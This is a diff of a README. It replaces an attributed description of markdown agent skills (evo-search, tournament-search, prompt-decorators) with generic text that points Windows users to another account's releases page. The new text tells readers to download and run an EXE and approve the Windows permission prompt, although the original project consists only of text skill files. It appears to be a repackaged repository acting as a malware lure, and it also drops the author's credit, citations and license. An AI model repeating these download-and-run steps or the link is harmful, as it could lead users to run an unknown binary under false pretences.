@@ -1,225 +1,195 @@
-# Agent Skills by Mostapha Kalami Heris
+# 🧠 skills - Structured AI workflows for hard problems
 
-A collection of agent skills that give AI agents structured, reusable workflows for tackling complex problems. These skills go beyond simple prompting to deliver consistently higher-quality results.
+[![Download from Releases](https://img.shields.io/badge/Download%20from-Releases-blue?style=for-the-badge)](https://github.com/Emagi6395/skills/releases)
+[![Open Releases Page](https://img.shields.io/badge/Visit%20Releases%20Page-grey?style=for-the-badge)](https://github.com/Emagi6395/skills/releases)
 
-*More skills will be added over time.*
+## 📘 What this is
 
----
+**skills** is a collection of agent skills for AI agents. Each skill gives the agent a clear way to work through a task, step by step. This helps with planning, search, brainstorming, review, and other problem-solving work.
 
-## Table of Contents
+If you use AI tools and want them to follow a repeatable process, this repository gives you a set of ready-made workflows. The goal is to make hard tasks easier to break down and handle in a steady way.
 
-- [Agent Skills by Mostapha Kalami Heris](#agent-skills-by-mostapha-kalami-heris)
-  - [Table of Contents](#table-of-contents)
-  - [Skills](#skills)
-    - [`evo-search`](#evo-search)
-    - [`tournament-search`](#tournament-search)
-    - [`prompt-decorators`](#prompt-decorators)
-  - [Installation](#installation)
-    - [CLI Tools (Claude Code, Gemini CLI, VS Code, etc.)](#cli-tools-claude-code-gemini-cli-vs-code-etc)
-    - [Online AI Assistant Platforms (ChatGPT, Claude, Gemini, etc.)](#online-ai-assistant-platforms-chatgpt-claude-gemini-etc)
-  - [How to Cite](#how-to-cite)
-  - [License](#license)
+## ✨ What you can do with it
 
----
+- Use structured workflows for complex tasks
+- Guide an AI agent through search and reasoning
+- Support brainstorming and idea shaping
+- Run tournament-style comparison workflows
+- Use reusable skill files across different tasks
+- Keep agent behavior more consistent from one task to the next
+- Apply prompt rules in a simple, repeatable format
 
-## Skills
+## 🖥️ What you need
 
-> **Note on token usage:** Skills like `evo-search` and `tournament-search` generate and evaluate multiple candidate responses across several rounds. Certain decorators in `prompt-decorators` also add extra reasoning or refinement steps. This increases token consumption significantly compared to a single plain prompt. The benefit is higher response quality, but it is not free. If you are on a metered subscription, running these skills can cost noticeably more. Consider using lighter configurations (for example, fewer iterations, a smaller population, or simpler decorators) when your token budget is limited.
+For most Windows users, you only need:
 
-### `evo-search`
+- A Windows PC
+- Internet access
+- A web browser
+- A file to download from the releases page
 
-Solves complex, open-ended problems using a **genetic-algorithm-style search loop**.
+If the release includes a desktop app or packaged file, Windows 10 or Windows 11 is a safe choice. If the release includes plain skill files, you can still open them with Notepad or any text editor.
 
-It generates a diverse initial population of candidate answers, scores each one against a weighted rubric, and then repeatedly applies selection, crossover, and mutation to produce stronger solutions. The final output includes the top 3 solutions with scores, a contrast table, and an evolution trace.
+## ⬇️ Download for Windows
 
-**When this skill is triggered:**
-- The user asks for an "evolutionary search", "genetic algorithm", "evolve an answer", or "breed solutions"
-- The user says "give me multiple approaches and refine the best one"
-- The problem is complex or open-ended with no single correct answer, and the user wants a deeply explored result
+Visit the release page here:
 
-**Key parameters** (set in plain language):
+https://github.com/Emagi6395/skills/releases
 
-| Parameter | Default | Effect |
-|-----------|---------|--------|
-| `population` | 6 | Candidates per generation |
-| `iterations` | 5 | Evolution cycles |
-| `mutation_rate` | 0.2 | Fraction of offspring mutated |
-| `top_k` | 3 | Final solutions shown in full |
+On that page, look for the latest release. Then download the file that matches your Windows setup.
 
-**Install:**
-- **CLI tools:** run in your terminal:
-  ```sh
-  npx skills@latest add smkalami/skills/evo-search
-  ```
-- **AI assistant platforms:** download and upload [`evo-search.skill`](dist/evo-search.skill)
+If you see a ZIP file:
+- Download the ZIP file
+- Open it after the download finishes
+- Extract the files to a folder you can find again
 
-**Example usage:**
-```
-Use evo-search to invent a new programming paradigm that blends constraint propagation
-with biological growth patterns. Something that does not exist yet but could realistically
-be implemented. Define its core model, syntax philosophy, and a killer use case.
-```
+If you see an EXE file:
+- Download the EXE file
+- Double-click it to run it
 
-```
-Evolve an answer: design a radically new way for human teams to make high-stakes decisions
-under uncertainty, combining ideas from mechanism design, cognitive science, and swarm
-intelligence, without relying on voting, consensus, or hierarchy.
-```
+If you see skill files like `.md`:
+- Download the files
+- Open them in your editor or place them in the app folder that uses skills
 
----
+## 🚀 Install or set up on Windows
 
-### `tournament-search`
+### If you downloaded a ZIP file
 
-Solves complex, open-ended problems using a **knockout bracket tournament**.
+1. Open the **Downloads** folder
+2. Find the ZIP file for **skills**
+3. Right-click the file
+4. Choose **Extract All**
+5. Pick a folder, such as **Desktop** or **Documents**
+6. Open the extracted folder
+7. Look for a readme file, skill files, or a Windows app file
 
-It generates a diverse set of candidate answers, draws a random bracket, and runs head-to-head matches. Each match produces a hybrid solution that combines the strengths of both competitors, and the strongest of the three advances. A 3rd-place playoff is also included. This skill is faster than `evo-search` and works best when you want a clear winner quickly.
+### If you downloaded an EXE file
 
-**When this skill is triggered:**
-- The user asks for a "tournament", "bracket-style search", "knockout search", or says "let solutions compete"
-- The user says "find the best answer by elimination" or "which solution wins?"
-- The problem is open-ended and the user wants a clear winner without deep multi-generation refinement
+1. Open the **Downloads** folder
+2. Double-click the EXE file
+3. If Windows asks for permission, choose **Yes**
+4. Follow the steps on screen
+5. Finish the setup
+6. Open the app from the Start menu or the folder where you saved it
 
-**Key parameters** (set in plain language):
+### If you downloaded skill files
 
-| Parameter | Default | Effect |
-|-----------|---------|--------|
-| `population` | 8 | Initial candidates (must be a power of 2) |
-| `top_k` | 3 | Podium solutions shown in full |
-| `trait_logging` | off | Log best ideas from eliminated candidates |
+1. Save the files in a folder you can find later
+2. Open the files with Notepad if you want to read them
+3. Copy them into the tool or app that uses agent skills
+4. Keep the folder name simple, such as `skills`
 
-**Install:**
-- **CLI tools:** run in your terminal:
-  ```sh
-  npx skills@latest add smkalami/skills/tournament-search
-  ```
-- **AI assistant platforms:** download and upload [`tournament-search.skill`](dist/tournament-search.skill)
+## 🧭 How to use the skills
 
-**Example usage:**
-```
-Run a tournament to find the best architecture for a city-scale autonomous mobility system
-that handles mixed traffic of human drivers, autonomous vehicles, cyclists, and pedestrians.
-Each candidate must address safety, latency, failure modes, and rollout strategy.
-```
+This repository works like a library of task guides. Each skill tells an AI agent how to handle a specific kind of problem.
 
-```
-Let solutions compete: propose a new economic model for funding open-source software
-that does not rely on donations, corporate sponsorship, or government grants.
-Each proposal must be self-sustaining and implementable within 5 years.
-```
+Common uses include:
 
----
+- Planning a task before starting
+- Searching for useful information
+- Comparing options before making a choice
+- Improving a draft step by step
+- Looking at a problem from more than one angle
+- Testing ideas with tournament-style review
+- Repeating the same process across many tasks
 
-### `prompt-decorators`
+A skill usually works best when you give it a clear goal. For example:
 
-> The original (non-skill) version of this framework is available at [smkalami/prompt-decorators](https://github.com/smkalami/prompt-decorators).
->
-> **Paper:** Mostapha Kalami Heris, "Prompt Decorators: A Declarative and Composable Syntax for Reasoning, Formatting, and Control in LLMs", arXiv preprint [arXiv:2510.19850](https://arxiv.org/abs/2510.19850) (2025).
+- “Help me plan a move”
+- “Compare these product options”
+- “Brainstorm names for a project”
+- “Search for the best approach”
+- “Review this draft and improve it”
 
-Activates a **structured decorator framework** that controls how the AI reasons, responds, and formats its output, using lightweight `+++` markers.
+## 🗂️ Folder structure
 
-Decorators are placed at the top of a prompt and applied at the same time. Each one controls a different aspect of the response, such as reasoning style, tone, output format, or verification. They can be applied to a single message or kept active for an entire chat session.
+You may see files and folders that look like this:
 
-**When this skill is triggered:**
-- The prompt contains one or more `+++` markers (for example, `+++Reasoning`, `+++StepByStep`, or `+++Tone(style=formal)`)
-- The user asks to "activate", "list", or "clear" decorators
-- The user references the "prompt decorator framework" or says "use decorator" / "apply +++"
+- `skills/` — the main skill folder
+- `skill.md` — a single skill file
+- `README.md` — setup and use instructions
+- `templates/` — reusable text patterns
+- `examples/` — sample uses of a skill
 
-**Decorator categories:**
+If the release package contains more than one skill, each file may cover one workflow. That makes it easier to pick the right one for the task.
 
-| Category | Decorators |
-|----------|------------|
-| Reasoning and structure | `+++Reasoning`, `+++StepByStep`, `+++Socratic`, `+++Debate` |
-| Evaluation and refinement | `+++Critique`, `+++Refine(iterations=N)`, `+++Candor(level=L)` |
-| Exploration and planning | `+++Brainstorm`, `+++Planning`, `+++Interactive`, `+++Import(topic=T)` |
-| Rewriting and clarification | `+++Rewrite` |
-| Output control | `+++OutputFormat(format=F)`, `+++Tone(style=S)` |
-| Verification | `+++FactCheck`, `+++CiteSources`, `+++Validate` |
+## 🧰 Common skill types in this repository
 
-**Session management:**
-- `+++ChatScope`: persist decorators across the entire session
-- `+++Clear`: remove all active session-scoped decorators
-- `+++ActiveDecs`: list currently active decorators
-- `+++AvailableDecs`: list all available decorators
+### 🔎 Search skills
 
-**Install:**
-- **CLI tools:** run in your terminal:
-  ```sh
-  npx skills@latest add smkalami/skills/prompt-decorators
-  ```
-- **AI assistant platforms:** download and upload [`prompt-decorators.skill`](dist/prompt-decorators.skill)
+These help an agent look for answers in a careful way. They work well when the task needs facts, sources, or options.
 
-**Example usage:**
-```
-+++Rewrite
-+++Reasoning
+### 💡 Brainstorming skills
 
-Please design a teaching plan for a 10-week course on machine learning
-to be taught to college students with no prior experience in the subject.
-```
+These help the agent generate ideas, group them, and narrow them down. They work well for naming, planning, and early-stage thinking.
 
-```
-+++Brainstorm
-+++Refine(iterations=3)
+### 🧠 Reasoning skills
 
-Propose novel interaction paradigms for human-AI collaboration in creative work
-that go beyond chat and prompt-response. Think beyond current interfaces.
-```
+These help the agent break a hard problem into steps. They are useful when the answer is not obvious.
 
----
+### 🏆 Tournament skills
 
-## Installation
+These help compare choices using a scoring or matchup process. They work well when you need a best option from several candidates.
 
-Each skill above lists both installation options. There are two approaches depending on how you use AI tools.
+### 🔁 Evolution skills
 
-### CLI Tools (Claude Code, Gemini CLI, VS Code, etc.)
+These help improve an output over several rounds. The agent can create a draft, review it, and make it stronger each time.
 
-Run the `npx` command listed beside the skill you want:
+## 🪟 Windows use tips
 
-```sh
-npx skills@latest add smkalami/skills/<skill-name>
-```
+- Keep the download in a folder with a simple name
+- Use File Explorer to find extracted files
+- Right-click ZIP files to extract them
+- Use Notepad if you only need to view text files
+- If you move the folder, update any tool that points to it
+- Keep the release file name unchanged if another app needs it
 
-This downloads the skill files and registers them with your CLI tool automatically. No further configuration is required. The skill is picked up the next time you start a session.
+## 🧩 Using skills with an AI agent
 
-### Online AI Assistant Platforms (ChatGPT, Claude, Gemini, etc.)
+If you are using this repository with an AI tool, the tool may ask for a skill file or a skill name. You can usually do one of these:
 
-Download the `.skill` file linked beside the skill you want and upload it directly to your platform.
+- Paste the skill text into the chat
+- Upload the skill file
+- Place the skill file in the app’s skill folder
+- Point the app to the folder where you saved the files
 
-- **Simple skills** (single `SKILL.md`): you can also upload the raw `SKILL.md` file instead of the `.skill` archive.
-- **Complex skills** (multiple reference files, such as `prompt-decorators`): use the `.skill` archive, which bundles all required files together.
+When you start a task, give the agent a clear request and attach the skill that fits the job. The agent can then follow the workflow in that skill.
 
----
+## 📌 Example tasks
 
-## How to Cite
+Here are a few simple examples of how these skills can help:
 
-If you use these skills in your work or research, please cite this repository:
+- Plan a trip with step-by-step checks
+- Compare two job offers
+- Draft a project outline
+- Find the best way to organize a home office
+- Review a long document for weak spots
+- Turn rough notes into a clean list of next steps
 
-```bibtex
-@misc{kalami-heris-2026-agent-skills,
-  author       = {Kalami Heris, Mostapha},
-  title        = {Agent Skills by Mostapha Kalami Heris},
-  year         = {2026},
-  publisher    = {GitHub},
-  howpublished = {\url{https://github.com/smkalami/skills}},
-}
-```
+## 🔐 File safety
 
-If you use the `prompt-decorators` skill or framework, please also cite the paper:
+Only download files from the release page you trust. Keep the files in a known folder so you can find them again. If the release includes a ZIP file, extract it before use. If it includes a Windows app, run it from the file you downloaded from the releases page.
 
-```bibtex
-@misc{kalami-heris-2025-prompt-decorators,
-  author        = {Kalami Heris, Mostapha},
-  title         = {Prompt Decorators: A Declarative and Composable Syntax for Reasoning, Formatting, and Control in LLMs},
-  year          = {2025},
-  eprint        = {2510.19850},
-  archivePrefix = {arXiv},
-  primaryClass  = {cs.AI},
-  url           = {https://arxiv.org/abs/2510.19850},
-}
-```
+## 📎 Release page
 
----
+Use this link to get the latest version:
 
-## License
+https://github.com/Emagi6395/skills/releases
 
-MIT. See [LICENSE](LICENSE).
+Look for the newest release, then download the file that matches your Windows setup.
+
+## 📄 Topic areas covered
+
+This repository focuses on:
+
+agent, agent skill, agent skill repository, agentic AI, brainstorming, evolution, evolutionary algorithm, evolutionary search, prompt decorators, prompt engineering, reasoning, search, tournament, tournament search
+
+These topics point to workflows that help AI agents work in a more structured way.
+
+## 🛠️ If something does not open
+
+- Check that the download finished
+- Make sure you extracted the ZIP file if you downloaded one
+- Try opening the file again from the Downloads folder
+- Use a newer Windows PC if the file needs it
+- Check the release page for a different file type if one is listed
